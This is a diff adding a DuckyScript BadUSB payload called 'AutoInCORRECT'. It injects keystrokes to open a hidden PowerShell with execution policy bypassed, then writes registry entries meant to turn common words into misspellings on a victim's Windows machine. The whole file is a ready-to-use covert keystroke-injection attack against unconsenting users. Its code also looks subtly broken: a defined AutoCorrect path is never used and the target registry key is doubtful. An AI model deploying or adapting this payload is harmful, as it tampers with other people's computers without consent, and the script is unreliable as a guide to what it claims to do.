@@ -1,0 +1,23 @@
+\
+REM Title: AutoInCORRECT
+REM Description: Sets up Windows autocorrect replacements that swap common words with wrong ones
+REM Target OS: Windows 10/11
+REM Author: DoctorSonic
+
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+ENTER
+DELAY 1200
+STRING $path='HKCU:\Software\Microsoft\Office\*\Word\AutoCorrect\Entries'
+ENTER
+DELAY 300
+STRING $swaps=@{'the'='teh';'and'='adn';'hello'='helo';'yes'='yse';'you'='yuo';'have'='ahve';'this'='thsi';'that'='taht'}
+ENTER
+DELAY 300
+STRING $swaps.GetEnumerator()|ForEach-Object{Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Spellingpersonalizations' -Name $_.Key -Value $_.Value -Force -ErrorAction SilentlyContinue}
+ENTER
+DELAY 500
+STRING Write-Host 'AutoCorrect rules applied!' -ForegroundColor Green; Start-Sleep 2; exit
+ENTER
